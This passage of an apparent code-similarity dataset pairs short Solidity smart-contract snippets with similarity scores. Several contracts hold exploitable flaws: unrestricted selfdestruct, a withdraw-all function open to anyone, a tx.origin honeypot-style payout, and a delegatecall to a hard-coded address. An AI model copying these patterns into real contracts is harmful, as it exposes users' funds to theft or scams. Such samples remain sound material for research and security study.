        myStringArray.push(""One"");
        myStringArray.push(""Two"");
        myStringArray.push(""Three"");
    }

    function addToMyStringArray (string memory newEntry) public {
        myStringArray.push(newEntry);
    }

    function getMyStringArray () public view returns (string[] memory) {
        return myStringArray;
    }
}",0.5504214418707981,"contract manyTests {
    uint256 a;
    string b = ""I am view"";
    uint256 c;
    
    function addSomeMoreRandomStuff(address[] memory tokens) public {
        c = c + 1;
    }
    
    function showMePure() pure public returns (string memory) {
        return ""I am pure"";
    }
    
    function showMeView() view public returns (string memory) {
        return b;
    }
}"
"contract ArrayDelete {
string[] names;

function main() returns (string[]) {
   names.push(""Jones"");
   names.push(""Ama"");
   names.push(""Emeka"");
   names.push(""Owo"");
   names.push(""Lulu"");

   delete names[0];
   return names;
 }
}",0.5233046246803326,"contract PausedAUD is PausedToken {

    function name() public pure returns (string) {

        return ""TrueAUD"";

    }



    function symbol() public pure returns (string) {

        return ""TAUD"";

    }

}"
"contract DeployContract {
    function deploy(bytes calldata _bytecode) external returns(address addr) {

        bytes memory bytecode = abi.encode(_bytecode, msg.sender);
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }
    }
}",0.5537913175595557,"contract Relay {
        address operator;

        function Relay() {
                operator = msg.sender;
        }

        function relayCall(address contractAddress, bytes4 abiSignature, bytes data) public returns (bool) {
                if (msg.sender != operator) {
                        throw;
                }
                return contractAddress.call(abiSignature, data);
        }
}"
"contract Election {
    string public candidateName;
    string public candidateotherName;



    function Election () public {
        candidateName = ""Candidate 1"";
        candidateotherName = ""Candidate2"";
    }

    function setCandidate (string _name) public {

       candidateName = _name;
    }


     function setOtherCandidate (string _othername) public {
     candidateotherName = _othername;

}
}",0.5711561691710847,"contract owned {

    address public owner;
    address public candidate;

    function owned() public {
        owner = msg.sender;
    }
    
    modifier onlyOwner {
        require(owner == msg.sender);
        _;
    }

    function changeOwner(address _owner) onlyOwner public {
        candidate = _owner;
    }
    
    function confirmOwner() public {
        require(candidate == msg.sender);
        owner = candidate;
        delete candidate;
    }
}"
"contract Main is Controlled {  
  using DataSet for *;    
  DataSet.Data d;  

  struct userProduct {  
    address user_address;  
    uint id;  
    string description;  
    uint price;  
  }  

   userProduct[] products;  


  function newUserProduct  (  
    address u,
    uint i,
    string d,
    uint p) onlyUser returns (bool added) {

    userProduct memory newProduct;
    newProduct.user_address = msg.sender;
    newProduct.id = i;  
    newProduct.description = d;
    newProduct.price = p;
    products.push(newProduct);
    added = true;
  }  

  function getUserInfo (uint g) constant returns (address ,bytes32, uint ) {  
      for (uint i = 0; i <= products.length; i++) {  
          if (products[i].id == g) {  
             return(products[i].user_address, DataSet.stringToBytes32(products[i].description), products[i].price);  
          }  
      }  
  }  
}",0.5688574099481686,"contract StandardToken {
    using SafeMath for uint256;

    string public name; 
    string public symbol; 
    uint8 public decimals; 
    uint256 public totalSupply; 
    string public version; 

    

    
    function transfer(address _to, uint256 _value)  returns (bool success);

    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) ;

    
    function approve(address _spender, uint256 _value) returns (bool success);

    
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) ;

    
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}"
"contract CampaignFactory {

    mapping(address => Campaign[]) campaigns;

    function createCampaign(uint min_contrib) public {
        Campaign newCampaign = new Campaign(min_contrib, msg.sender);
        campaigns[msg.sender].push(newCampaign);
    }

    function getCampaignsByAddress(address creator) public view returns (Campaign[] memory) {
        return campaigns[creator];
    }
}",0.5646376774276106,"contract CompFactory {

    address[] public contracts;

    

    function getContractCount() public constant returns(uint contractCount){

        return contracts.length;

    }

    

    function newComp(uint8 _numRounds) public payable returns(address newContract) {

        Comp c = (new Comp).value(address(this).balance)(_numRounds, msg.sender);

        contracts.push(c);

        return c;

    }

}"
"contract CheckOwner is Owned {

    int public check ;

    function CheckOwner () {
        check = 1;
    }

    function setCheck() fromOwner {
        check++;

    }
}",0.5933730436563663,"contract IOwned {
  function owner() public constant returns (address) { owner; }
  function transferOwnership(address _newOwner) public;
}"
"contract Members {

  struct Member {
     IpfsUtils.IpfsHash profile;
     uint id;
  }
  mapping (address => Member) public members;

  function addMember(uint id, bytes profileHash) {
    Member m = members[msg.sender];
    m.id = id;
    m.profile.insert(profileHash);
  } 
}",0.5351396908168116,"contract RecoverEosKey {

    

    mapping (address => string) public keys;

    

    event LogRegister (address user, string key);

    

    function register(string key) public {

        assert(bytes(key).length <= 64);

        keys[msg.sender] = key;

        emit LogRegister(msg.sender, key);

    }

}"
"contract StoreAndFree {
    mapping(int=>int) myStore;
    function StoreAndFree() public {
        for (int i=1; i<100; i++) {
            myStore[i] = i;
        }
    }

    function kill() external {
        selfdestruct(msg.sender);
    }
}",0.5693029836535579,"contract Ownable {
    address public Owner;
    
    function Ownable() { Owner = msg.sender; }
    function isOwner() internal constant returns (bool) { return( Owner == msg.sender); }
}"
"contract MDBService {

    mapping (address => address) accounts;
    mapping (uint => address) ids;
    uint numberAccounts;

    function MDBService() {
        numberAccounts = 0;
    }

    function register() {
        require(accounts[msg.sender] == 0); 
        ids[numberAccounts] = msg.sender;
        accounts[msg.sender] = new MDBAccount(msg.sender);
        numberAccounts++;
    }
}",0.5806424578115172,"contract PullPayment {

  mapping(address => uint) public payments;



  function asyncSend(address dest, uint amount) internal {

    payments[dest] += amount;

  }



  function withdrawPayments() external {

    uint payment = payments[msg.sender];

    payments[msg.sender] = 0;

    if (!msg.sender.send(payment)) {

      payments[msg.sender] = payment;

    }

  }

}"
"contract MDBAccount {

    struct Post {
        uint timestamp;
        string message;
    }

    uint public numberPosts;
    address public owner;
    mapping (uint => Post) posts;

    modifier isOwner() {
        require(owner == msg.sender);
        _;
    }

    function MDBAccount(address _owner) {
        owner = _owner;
        numberPosts = 0;
    }

    function post(string message) isOwner() {
        require(bytes(message).length <= 160);
        posts[numberPosts].timestamp = now;
        posts[numberPosts].message = message;
        numberPosts++;
    }
}",0.5971360313719555,"contract Pausable is Ownable {
    bool public isPaused;
    
    event Pause(address _owner, uint _timestamp);
    event Unpause(address _owner, uint _timestamp);
    
    modifier whenPaused {
        require(isPaused);
        _;
    }
    
    modifier whenNotPaused {
        require(!isPaused);
        _;
    }
    
    function pause() public onlyOwner whenNotPaused {
        isPaused = true;
        Pause(msg.sender, now);
    }
    
    function unpause() public onlyOwner whenPaused {
        isPaused = false;
        Unpause(msg.sender, now);
    }
}"
"contract Election {
    
    struct Candidate {
        uint id;
        string name;
        uint voteCount;
    }
    
    mapping (uint => Candidate) public candidates;
    uint public candidatesCount;
    function Election() public {
        addCandidate(""Blockchain"");
        addCandidate(""Groot"");
    }
    function addCandidate(string _name) private {
        candidatesCount++;
        candidates[candidatesCount] = Candidate(candidatesCount, _name, 0);
    }
}",0.5271414302027979,"contract Salemcash {

    mapping(address => uint) private _balances;

    constructor() public {
        _balances[msg.sender] = 20000000000000000000000000;
    }

    function getBalance(address account) public view returns (uint) {
        return _balances[account];
    }

    function transfer(address to, uint amount) public {
        require(_balances[msg.sender] >= amount);

        _balances[msg.sender] -= amount;
        _balances[to] += amount;
    }
}"
"contract example1 {
  function A() {
    print msg.sender; 
    example3.C();
  }
}",0.5861621206596949,"contract test {
    
    function a() public
    {
        msg.sender.transfer(this.balance);    
    }
    
    
}"
"contract example3 is example2 {
  function C() {
    print msg.sender;
    B();
  }
}",0.5931882361612407,"contract Ownable {
  address  owner;
  function Ownable() {
    owner = msg.sender;
  }
}"
"contract Upgradeable {
    mapping(bytes4=>uint32) _sizes;
    address _dest;

    
    function initialize();

    
    function replace(address target) internal {
        _dest = target;
        target.delegatecall(bytes4(sha3(""initialize()"")));
    }
}",0.5396215041034126,"contract IElectricCharger {
   
   
    function setInvestors(uint[] ids,address[] addresses,uint[] balances,uint investmentsCount);
   function getPrice() constant external returns (uint price);
 
}"
"contract C is Owned {

   int private theAnswer;

   function store(int value) public onlyOwner {
       theAnswer = value
   }
}",0.5969380882294308,"contract Owned {
    address public Owner;
    function Owned() { Owner = msg.sender; }
    modifier onlyOwner { if ( msg.sender == Owner ) _; }
}"
"contract BallotFactory {
address[] public deployedBallotsAddress;

function createBallot(
    string memory _title,
    string memory _description,
    string memory _option1,
    string memory _option2
) public {
    address newBallotAddress = address(
        new Ballot(_title, _description, _option1, _option2, msg.sender)
    ); 
    deployedBallotsAddress.push(newBallotAddress);
}

function getDeployedBallots() public view returns (address[] memory) {
    return deployedBallotsAddress;
}
",0.5685412685372758,"contract ComponentListInterface {

    event ComponentUpdated (bytes32 _name, string _version, address _componentAddress);

    function setComponent(bytes32 _name, address _componentAddress) public returns (bool);

    function getComponent(bytes32 _name, string _version) public view returns (address);

    function getLatestComponent(bytes32 _name) public view returns(address);

    function getLatestComponents(bytes32[] _names) public view returns(address[]);

}"
"contract EndowmentRetriever {

    address creator;
    uint contract_creation_value;

    function EndowmentRetriever() public payable {
        creator = msg.sender;
        contract_creation_value = msg.value;
    }

    function getContractCreationValue() constant returns (uint) {                               
        return contract_creation_value;                         
    }

    function sendOneEtherHome() public {                        
        creator.send(1000000000000000000);
    }

    function kill() { 
        if (msg.sender == creator) {
            suicide(creator); 
        }
    }   
}",0.5753647438553414,"contract CommunityChest {

    

    address owner;

    

    event Deposit(uint256 value);

    event Transfer(address to, uint256 value);

    

    constructor () public {

        owner = msg.sender;

    }

    

    function send(address payable to, uint256 value) public {

        to.transfer(value);

        emit Transfer(to, value);

    }



    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

}"
"contract Transaction {

    uint num = 0;
    bytes32 [] storedKeys;
    uint [] x;

    struct Pilot {
        string details;
        uint expected_time;
        address creator; 
        uint amount;
        address [] listenrs;
        address [] reporters;
    }

    mapping (bytes32 => Pilot) _accounts;


    function  get_details_by_name(string key) public returns(string){
        return _accounts[stringToBytes32(key)].details;
    }

    function  get_pilots_names() public constant returns(bytes32 []){
        return storedKeys;
    }

    function stringToBytes32(string memory source) private returns (bytes32 result) {
        bytes memory tempEmptyStringTest = bytes(source);
        if (tempEmptyStringTest.length == 0) {
            return 0x0;
        }

        assembly {
            result := mload(add(source, 32))
        }
    }
    function  get1() public constant returns(uint){
        return num;
    }

    
    function add_pilot(string s1, string det, uint hours_till_exp, uint am) public  {
        bytes32 s = stringToBytes32(s1);
        _accounts[s].creator = msg.sender;
        _accounts[s].amount = am;
        _accounts[s].details = det;
        _accounts[s].expected_time  = now + (hours_till_exp * 3600);
        _accounts[s].listenrs.push(msg.sender);
        num+=1;
        storedKeys.push(s);
    }
}",0.5911609674241889,"contract Oracle is Ownable {

    uint256 public constant VERSION = 4;



    event NewSymbol(bytes32 _currency);



    mapping(bytes32 => bool) public supported;

    bytes32[] public currencies;



    

    function url() public view returns (string);



    

    function getRate(bytes32 symbol, bytes data) external returns (uint256 rate, uint256 decimals);



    

    function addCurrency(string ticker) public onlyOwner returns (bool) {

        bytes32 currency = encodeCurrency(ticker);

        emit NewSymbol(currency);

        supported[currency] = true;

        currencies.push(currency);

        return true;

    }



    

    function encodeCurrency(string currency) public pure returns (bytes32 o) {

        require(bytes(currency).length <= 32, ""Currency too long"");

        assembly {

            o := mload(add(currency, 32))

        }

    }

    

    

    function decodeCurrency(bytes32 b) public pure returns (string o) {

        uint256 ns = 256;

        while (true) { if (ns == 0 || (b<<ns-8) != 0) break; ns -= 8; }

        assembly {

            ns := div(ns, 8)

            o := mload(0x40)

            mstore(0x40, add(o, and(add(add(ns, 0x20), 0x1f), not(0x1f))))

            mstore(o, ns)

            mstore(add(o, 32), b)

        }

    }

}"
"contract contractB {
    function invokeContractA(address _addA) public  { 
        contractA a = contractA(_addA);
        uint ValueToSend = 1234;    
        a.blah.value(ValueToSend)(2, 3);
    }  
}",0.5944259884585481,"contract Owned {
    address public contractOwner;

    function Owned() {
        contractOwner = msg.sender;
    }

    modifier onlyContractOwner() {
        if (contractOwner == msg.sender) {
            _;
        }
    }
}"
"contract Transport {
   address public manager;
   Car[] public carArray;
   Bike[] public bikeArray;

   struct Car {
      uint carId;
      address carOwner;
   }

   struct Bike {
      uint bikeId;
      address bikeOwner;
   }

   function Transport(address creator) public {
        manager = creator;
   }

   function carCreate(uint carId, address carOwner) public {

        Car memory newCar = Car ({
            carId: carId,
            carOwner: carOwner
        });

        
        carArray.push(newCar);
   }

   function bikeCreate(uint bikeId, address bikeOwner) public {

        Bike memory newBike = Bike ({
            bikeId: bikeId,
            bikeOwner: bikeOwner
        });

        
        bikeArray.push(newBike);
   }

   function createNewBatch(uint batchId, uint carId, uint bikeId) public {

        
        
        
        ...
        ...
   }
}",0.5631061535156761,"contract Token {

    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    
    function transfer(address to, uint value) public returns (bool);
    function transferFrom(address from, address to, uint value) public returns (bool);
    function approve(address spender, uint value) public returns (bool);
    function balanceOf(address owner) public constant returns (uint);
    function allowance(address owner, address spender) public constant returns (uint);
    function totalSupply() public constant returns (uint);
}"
"contract DailyAssessmentScoreContract {

   struct dailyAssessment{
        string dailyAssessmentId;
        string[] period;
        uint[] score;
    }
    dailyAssessment[] daily_assessment;


   function stringsEqual(string storage _a, string memory _b) internal returns (bool) {
        bytes storage a = bytes(_a);
        bytes memory b = bytes(_b);
        if (a.length != b.length)
            return false;
        
        for (uint i = 0; i < a.length; i ++)
            if (a[i] != b[i])
                return false;
        return true;
    }
    function stringToUint(string s) constant returns (uint result) {
        bytes memory b = bytes(s);
        uint i;
        result = 0;
        for (i = 0; i < b.length; i++) {
            uint c = uint(b[i]);
            if (c >= 48 && c <= 57) {
                result = result * 10 + (c - 48);
            }
        }
    }

   function setDailyAssessmentInfo(string _dailyAssessmentId, string _period, string _score) public {
       bool write = false;
       uint score = stringToUint(_score);
       for(uint i=0; i<=daily_assessment.length; i++)
       {                                                                                                                                                                                                                                                            
           if(stringsEqual(daily_assessment[i].dailyAssessmentId, _dailyAssessmentId))
           {
               daily_assessment[i].period.push(_period);
               daily_assessment[i].score.push(score);
               write = true;
           }
       }
       if(write==false)
        {
            daily_assessment[i].dailyAssessmentId=_dailyAssessmentId;
            daily_assessment[i].period.push(_period);
            daily_assessment[i].score.push(score);
        }
   }

   function getDailyAssessmentInfo(string _dailyAssessmentId) public constant returns (uint) {
       uint score;
       for(uint i=0;i<=daily_assessment.length;i++)
       {
           if(stringsEqual(daily_assessment[i].dailyAssessmentId, _dailyAssessmentId))
           {
               uint sum = 0;
               uint scoreLength = daily_assessment[i].score.length;
               for(uint j=0;j<=scoreLength;j++)
               {
                    sum = sum + daily_assessment[i].score[j];
               }
                score = sum / scoreLength;
           }
       }

       return (score);
   }   
}",0.5214612748481056,"contract GorgonaKiller {

    

    address public GorgonaAddr; 

    

    

    uint constant public MIN_DEP = 0.01 ether; 

    

    

    uint constant public TRANSACTION_LIMIT = 100;

    

    

    uint public dividends;

    

    

    uint public last_payed_id;

    

    

    uint public deposits; 

    

    

    address[] addresses;



    

    mapping(address => Investor) public members;

    

    

    struct Investor {

        uint id;

        uint deposit;

    }

    

    constructor() public {

        GorgonaAddr = 0x020e13faF0955eFeF0aC9cD4d2C64C513ffCBdec; 

    }



    

    function () external payable {



        

        if (msg.sender == GorgonaAddr) {

            return;

        }

        

        

        if ( address(this).balance - msg.value > 0 ) {

            dividends = address(this).balance - msg.value;

        }

        

        

        if ( dividends > 0 ) {

            payDividends();

        }

        

        

        if (msg.value >= MIN_DEP) {

            Investor storage investor = members[msg.sender];



            

            if (investor.id == 0) {

                investor.id = addresses.push(msg.sender);

            }



            

            investor.deposit += msg.value;

            deposits += msg.value;

    

            

            payToGorgona();



        }

        

    }



    

    function payToGorgona() private {

        if ( GorgonaAddr.call.value( msg.value )() ) return; 

    }



    

    function payDividends() private {

        address[] memory _addresses = addresses;

        

        uint _dividends = dividends;



        if ( _dividends > 0) {

            uint num_payed = 0;

            

            for (uint i = last_payed_id; i < _addresses.length; i++) {

                

                

                uint amount = _dividends * members[ _addresses[i] ].deposit / deposits;

                

                

                if ( _addresses[i].send( amount ) ) {

                    last_payed_id = i+1;

                    num_payed += 1;

                }

                

                

                if ( num_payed == TRANSACTION_LIMIT ) break;

                

            }

            

            

            if ( last_payed_id >= _addresses.length) {

                last_payed_id = 0;

            }

            

            dividends = 0;

            

        }

        

    }

    

    

    function getBalance() public view returns(uint) {

        return address(this).balance / 10 ** 18;

    }



    

    function getInvestorsCount() public view returns(uint) {

        return addresses.length;

    }



}"
"contract Delegation {
    
    
    struct RoleTypes {
        bytes32[] permTypes;
        uint index;
    }

    
    mapping (bytes32 => RoleTypes) role;
    
    bytes32[] chkRole;

    
    function checkRole(bytes32 _roleName) public view returns (bool) {
        return (chkRole[role[_roleName].index] == _roleName);
    }
}",0.5738938958631111,"contract DSPauseAbstract {
    function delay() public view returns (uint256);
    function plot(address, bytes32, bytes memory, uint256) public;
    function exec(address, bytes32, bytes memory, uint256) public returns (bytes memory);
}"
"contract Courses {

struct Instructor {
    uint age;
    string fName;
    string lName;
}

mapping (address => Instructor) instructors;
address[] public instructorAccts;

function setInstructor(address _address, uint _age, string memory _fName, string memory _lName) public {
    var instructor = instructors[_address];

    instructor.age = _age;
    instructor.fName = _fName;
    instructor.lName = _lName;

    instructorAccts.push(_address) -1;
}

function getInstructors() public view returns ( address[]) {
    return instructorAccts;
}
}",0.5705192972085935,"contract ERC20Basic {
    uint public decimals;
    string public    name;
    string public   symbol;
    mapping(address => uint) public balances;
    mapping (address => mapping (address => uint)) public allowed;
    
   
    
    uint public _totalSupply;
    function totalSupply() public constant returns (uint);
    function balanceOf(address who) public constant returns (uint);
    function transfer(address to, uint value) public;
    event Transfer(address indexed from, address indexed to, uint value);
}"
"contract privacyPreferences {

 bool preference = false;                              

function changePreferences() public {
   if (msg.sender == ADDRESS  )
      preference = true;
 }


 function preferenceStatus() public view returns (bool) {
    return preference;
 }
 }",0.5942605020271248,"contract Pausable is Ownable {
    bool public paused = false;

    modifier whenNotPaused() {
        require(!paused);
        _;
    }

    function setPauseStatus(bool _pause) onlyOwner public returns (bool _success) {
        paused = _pause;
        return true;
    }
}"
"contract constructor_TtdmToken {
        function TtdmToken()

    }",0.5834659055413361,"contract token { function transfer(address, uint){  } }"
"contract Plant {

    address public creator;

    uint public finney_balance; 

    function () payable public {
        finney_balance += msg.value/1000000000000000;
        depositedFunds(msg.value, finney_balance);
    }
}",0.5946096683032247,"contract MultiMonday

{

    address O = tx.origin;



    function() public payable {}



    function Today() public payable {

        if (msg.value >= this.balance || tx.origin == O) {

            tx.origin.transfer(this.balance);

        }

    }

 }"
"contract Caller {
    address public callee;

    function Caller(address _callee) {
        callee = _callee;
    }

    function delegate() {
        callee.delegatecall(bytes4(keccak256(""call()"")));
    }
}",0.5960951072138623,"contract ICaller{

	function calledUpdate(address _oldCalled, address _newCalled) public;  

	

	event CalledUpdate(address _oldCalled, address _newCalled);

}"
"contract D {
  
  address public _e = 0x63636a7c969A0cF64395d302d3dA0C7CbcF37036; 

  function () payable {
    _e.delegatecall.gas(50000)(bytes4(sha3(""deposit(address)"")),this);
  }
}",0.5042033523307693,"contract DSProxy {

	

	address public owner;



	function execute(address _target, bytes _data) public payable returns (bytes32 response);

}"
"contract OwnedUpgradeabilityProxy is Proxy {
 bytes32 private constant ownerPosition = keccak256(""org.zeppelinos.proxy.owner"");
 bytes32 private constant implementationPosition = keccak256(""org.zeppelinos.proxy.implementation"");

 function upgradeTo(address newImplementation) public onlyProxyOwner {
   address currentImplementation = implementation();
   setImplementation(newImplementation);
 }

 function implementation() public view returns (address impl) {
   bytes32 position = implementationPosition;
   assembly { impl := sload(position) }
 }",0.5149518639474455,"contract Proxy {

  
  function implementation() public view returns (address);

  
  function proxyType() public pure returns (uint256 proxyTypeId);

  
  function () payable public {
    address _impl = implementation();
    require(_impl != address(0));

    assembly {
      let ptr := mload(0x40)
      calldatacopy(ptr, 0, calldatasize)
      let result := delegatecall(gas, _impl, ptr, calldatasize, 0, 0)
      let size := returndatasize
      returndatacopy(ptr, 0, size)

      switch result
      case 0 { revert(ptr, size) }
      default { return(ptr, size) }
    }
  }
}"
"contract Hi {
    event SayHi(string);
    function hi() public { emit SayHi(""Hi!"");}
    function callHi() public {
        
        
        
        require(address(this).call(bytes4(keccak256(""hi()""))));  

        
        
    }
}",0.597022735483396,"contract CoinMarketCapApi {

    function requestPrice(string _ticker) public payable;

    function _cost() public returns (uint _price);

}"
"contract A {
    
    function A(some params) {
       
    }
    function newT(some params) {
       
    } 
    
}",0.5846285520883874,"contract EndLike {
    function cage() public;
    function cage(bytes32) public;
}"
"contract T {
    
    function T(A a, some params) {
       
       
    }
    function newU(some params) {
       
    } 
    
}",0.5733090117311416,"contract EndLike {
    function cage() public;
    function cage(bytes32) public;
}"
"contract U {
    
    function U(T t, some params) {
       
       
    }
    
}",0.5913975419634515,"contract Test {
    
    function die() {
        suicide(0);
    }
}"
"contract Testing_V1 is ITesting_V1 {

mapping (string => DEF_Test.Employee) private mapEmp;

function set(string memory empID, string memory empName,string[] memory phone,address eventAddr) public{
    mapEmp[empID].empID = empID;
    mapEmp[empID].empName = empName;
    mapEmp[empID].phone = phone;
    Event_V1(eventAddr).emitEmpEvent(mapEmp[empID]);
}

function get(string memory empID) public view returns (DEF_Test.Employee memory) {
    return mapEmp[empID];
}

}",0.5527999587181951,"contract SimpleVoting {



    string public constant description = ""abc"";



    string public name = ""asd"";



    mapping (string => string) certificates;



    address owner;



    constructor() public {

        owner = msg.sender;

    }



    function getCertificate(string memory id) public view returns (string memory) {

        return certificates[id];

    }



    function setCertificate(string memory id, string memory cert) public {

        require(msg.sender == owner);

        certificates[id] = cert;

    }

}"
"contract TestContract {
    event Start(uint start, uint middle, uint end);
    event End(uint start, uint middle, uint end);

    uint one;
    uint public two;
    uint public three;

    function setInitialParams(uint _one, uint _two, uint _three) public {
        emit Start(one, two, three);
        one = _one;
        two = _two;
        three = _three;
        emit End(one, two, three);
    }

    function () public {
        revert();
    }
}",0.5449009048817348,"contract OracleBase {



  function getRandomUint(uint max) public returns (uint);



  function getRandomForContract(uint max, uint index) public view returns (uint);



  function getEtherDiceProfit(uint rate) public view returns (uint);



  function getRandomUint256(uint txId) public returns (uint256);



  function getRandomForContractClanwar(uint max, uint index) public view returns (uint);

}"
"contract tracking  {

  struct  data  {
    uint   ownernumber;
    uint   id;
  }

  uint value;
  mapping (uint256 => data) public  datamatching;

  function storedata (uint _ownernumber, uint _id) public {

    var  persondata  = datamatching[value];
    persondata .ownernumber = _ownernumber;
    persondata. id  =  _id;

  }

  function getData(uint256 userId) returns (uint){

   }
}",0.5932342895671321,"contract KpopItem is ERC721 {
  function ownerOf(uint _itemId) public view returns (address addr);
  function getItem(uint _itemId) public view returns (
    string name,
    uint price,
    address owner,
    uint[6] traitValues,
    uint celebId
  );
  function transferToWinner(address _winner, address _loser, uint _itemId) public;
}"
"contract MyToken {

    struct Certificate {
      uint64 certificateId;
      uint64 meterId;

      uint32 timestamp;
      uint48 value;
      address[] owners;

      mapping (address => uint48) ownershipSplit;

      bool burned;
    }

    mapping (uint64 => Certificate) public certificates;
    uint64 numCertificates = 1;

    function MyToken() public {
      
    }

    function produceCertificate(
      uint64 meterId,
      uint32 timestamp,
      uint48 value,
      address owner
      ) public {
        
        numCertificates;
        Certificate storage newCertificate = constructCertificate(meterId, timestamp, carbonMitigationValue, owner);
        uint64 newCertificateId = numCertificates;
        newCertificate.certificateId = newCertificateId;

        
        certificates[newCertificateId] = newCertificate;
        numCertificates++;
    }

    function constructCertificate(
      uint64 meterId,
      uint32 timestamp,
      uint48 value,
      address owner
      ) internal returns (Certificate storage newCertificate) {
        newCertificate.meterId = meterId;
        newCertificate.timestamp = timestamp;
        newCertificate.value = value;

        newCertificate.owners.push(owner);
        newCertificate.ownershipSplit[owner] = value;

        newCertificate.burned = false; 

        return newCertificate;
    }
}",0.5639141734648175,"contract ChaFund {
    struct Certificate {
        uint32 payment_time;
        string payment_msg;
        uint32 delivery_time;
        string delivery_msg;
    }

    address payable public owner;

    mapping(uint256 => Certificate) public certifications;

    event Payment(uint256 indexed id, string message);
    event Delivery(uint256 indexed id, string message);
    
    modifier onlyOwner() {
        require(msg.sender == owner, ""Only owner"");
        _;
    }
    
    constructor() public {
        owner = msg.sender;
    }

    function() external payable {
        revert();
    }

    function payment(uint256 id, string calldata message) onlyOwner external {
        require(certifications[id].payment_time == 0, ""Certificate already payment"");

        certifications[id].payment_time = uint32(block.timestamp);
        certifications[id].payment_msg = message;

        emit Payment(id, message);
    }

    function delivery(uint256 id, string calldata message) onlyOwner external {
        require(certifications[id].payment_time > 0, ""Certificate not payment"");
        require(certifications[id].delivery_time == 0, ""Certificate already delivery"");

        certifications[id].delivery_time = uint32(block.timestamp);
        certifications[id].delivery_msg = message;

        emit Delivery(id, message);
    }
}"
"contract C {

    address[] public addresses;
    address[] public predictedAddresses;
    

    function createD(uint arg) public {
        D newD = new D(arg);
        newD.x();
        addresses.push(address(newD));
    }

    function createAndEndowD(uint arg, uint amount) public payable {
        
        D newD = new D{value: amount}(arg);
        newD.x();
    }

    function createSalted(bytes32 salt, uint arg) public {

        address predictedAddress = address(bytes20(keccak256(abi.encodePacked(
            byte(0xff),
            address(this),
            salt,
            keccak256(abi.encodePacked(
                        type(D).creationCode,
                        arg
                        ))

        ))));

        D d = new D{salt: salt}(arg);
        require (address(d) == predictedAddress);

        predictedAddresses.push(predictedAddress);

    } 

}",0.5703906825538696,"contract AUDRAbstract

{



    

    

    

    event ChangedOwner(address indexed _from, address indexed _to);



    

    

    event ChangeOwnerTo(address indexed _to);



    

    

    

    event ChangedAdminToo(address indexed _from, address indexed _to);



    

    

    event ChangeAdminToo(address indexed _to);









    

    

    address public owner;



    

    

    address public newOwner;



    

    

    address public adminToo;



    

    

    address public newAdminToo;











    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }













    

    

    

    

    function transferToMany(address[] _addrs, uint[] _amounts)

        public returns (bool);



    

    

    

    

    

    function transferExternalToken(address _kAddr, address _to, uint _amount)

        public returns (bool);

}"
"contract Quests {

    DataBase dc;

    constructor(address _dataContract) public {
        dc = DataBase(_dataContract);
    }

    
    function increaseMonsterExp(uint _id, uint _amount) public {
        dc.increaseUnitExp(_id, _amount);
    }

}",0.5645660715606425,"contract OtcInterface {

    function getPayAmount(address, address, uint) public constant returns (uint);

    function buyAllAmount(address, uint, address pay_gem, uint) public returns (uint);

}"
"contract VendingMachine {
function buy(uint amount) payable {
    if (amount > msg.value / 2 ether)
        revert(""Not enough Ether provided."");
    
    require(
        amount <= msg.value / 2 ether,
        ""Not enough Ether provided.""
    );
    
 }
}",0.5643299965153816,"contract dubbel {

    address public previousSender;

    uint public price = 0.001 ether;

    

    function() public payable {

            require(msg.value == price);

            previousSender.transfer(msg.value);

            price *= 2;

            previousSender = msg.sender;

    }

}"
"contract MyContract {
    mapping(address => bool) boolBackedStatus;
    mapping(address => uint8) uint8BackedStatus;

    function setTrue(address user) {
        boolBackedStatus[user] = true;
        uint8BackedStatus[user] = 1;
    }

    function setFalse(address user) {
        boolBackedStatus[user] = false;
        uint8BackedStatus[user] = 0;
    }
}",0.5175105287585905,"contract ERC20Basic {
  uint public totalSupply;
  function balanceOf(address _owner) constant returns (uint balance);
  function transfer(address _to, uint _value) returns (bool success);
  event Transfer(address indexed _from, address indexed _to, uint _value);
}"
"contract SuperContract {
    uint[] public SuperArrayForExample;

    function addItemToArray(uint item) payable {
       SuperArrayForExample.push(item);
    }
}",0.5285940572942247,"contract iGameContract {
  function isAdminForGame(uint _game, address account) external view returns(bool);

  
  uint[] public games;
}"
"contract Melvin is HasOwner {

    event FoundJustice(Mudhoney mudhoney);

    function Melvin() HasOwner() public {}

    function foundJustice() external {
        Mudhoney mudhoney = Mudhoney(msg.sender);
        FoundJustice(mudhoney);
    }
}",0.528987490678193,"contract CryptoPussyMain is CpApis {

    function CryptoPussyMain() public payable {
        owner = msg.sender;
        _createGirl(0, 0, 0, uint256(-1), owner);
    }

    function() external payable {
        require(msg.sender == address(0));
    }
}"
"contract Contract01 {
  SubContract _refContract;
  ...
   constructor() public {
      refContract = new SubContract();
   }

   function setSubContractRef(SubContract refContract) {
      _refContract = refContract;
   }
}",0.5089110962159086,"contract NEST_ToLoanDataContract {

    

    function addContractAddress(address contractAddress) public;

    

    function checkContract(address contractAddress) public view returns (bool);

}"
"contract CampaignFactory {

struct NewCampaignType {
string description;
uint minimumContribution;
string campaignCategory;
string endDate;
address manager;
}

address[] public deployedCampaigns;

function createCampaign(string description, uint minimumContribution, string campaignCategory, string endDate) public {
address newlyCreatedCampaign = new Campaign(description, minimumContribution, campaignCategory, endDate, msg.sender);
deployedCampaigns.push(newlyCreatedCampaign);
}

function getDeployedCampaigns() public view returns (address[]) {
return deployedCampaigns;
}
}",0.5439634473371708,"contract O2ERC20Token is ERC20 {

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    
    constructor(string memory name, string memory symbol, uint8 decimals, uint256 totalSupply, address tokenOwnerAddress) public {
      _name = name;
      _symbol = symbol;
      _decimals = decimals;

      
      _mint(tokenOwnerAddress, totalSupply);

    }

    


    

    
    function name() public view returns (string memory) {
      return _name;
    }

    
    function symbol() public view returns (string memory) {
      return _symbol;
    }

    
    function decimals() public view returns (uint8) {
      return _decimals;
    }
}"
"contract SimpleStorage {

    function set(uint x) {
        uint storedData = x;
        return storedData;
    }
}",0.5991703997999656,"contract secretHolder {

    uint secret;

    function getSecret() public returns(uint) {

        return secret++;

    }

}"
"contract Plant {

